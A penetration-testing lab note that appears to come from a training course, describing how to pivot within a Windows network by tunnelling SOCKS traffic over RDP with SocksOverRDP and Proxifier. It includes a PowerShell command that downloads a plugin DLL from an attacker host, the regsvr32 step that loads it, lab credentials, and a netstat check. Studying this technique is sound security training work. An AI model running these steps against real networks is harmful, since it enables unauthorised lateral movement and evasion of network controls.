---
description: >-
  There are often times during an assessment when we are limited to a Windows
  network and do not have access to SSH for pivoting. We have to use tools
  available for Windows in these cases.
---

# RDP and SOCKS Tunneling with SocksOverRDP

[SocksOverRDP ](https://github.com/nccgroup/SocksOverRDP)is an example of a tool that uses _**Dynamic Virtual Channels (DVC)**_ from the Remote Desktop Service feature of Windows. DVC is responsible for tunneling pacakets over the RDP connection. For example, clipboard data transfer and audio sharing. _**However this feature can be used to tunnel arbitrary packets over the network.**_

We will use the tool [Proxifier](https://www.proxifier.com/) as our proxy server.



We can start by downloading the appropriate binaries to our attack host to perform this attack. Having the binaries on our attack host will allow us to transfer them to each target where needed. We will need:

1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases)
2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)

* We can look for `ProxifierPE.zip`

We can then connect to the target using xfreerdp and copy the `SocksOverRDPx64.zip` file to the target. From the Windows target, we will then need to load the SocksOverRDP.dll using regsvr32.exe.

```powershell
PS C:> Invoke-WebRequest -Uri "http://10.10.16.58:8081/SocksOverRDP-Plugin.dll" -OutFile "SocksOverRDP-Plugin.dll"
```

**Loading SocksOverRDP.dll using regsvr32.exe**



<pre class="language-powershell"><code class="lang-powershell"><strong>PS C:\Users\victim\Desktop\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
</strong></code></pre>

\
Now we can connect to 172.16.5.19 over RDP using `mstsc.exe`, and we should receive a prompt that the SocksOverRDP plugin is enabled, and it will listen on 127.0.0.1:1080. We can use the credentials `victor:pass@123` to connect to 172.16.5.19.

When we go back to our foothold target and check with Netstat, we should see our SOCKS listener started on 127.0.0.1:1080.

**Confirming the SOCKS Listener is Started**

```powershell
C:\Users\victim\Desktop\SocksOverRDP-x64> netstat -antb | findstr 1080

  TCP    127.0.0.1:1080         0.0.0.0:0              LISTENING
```

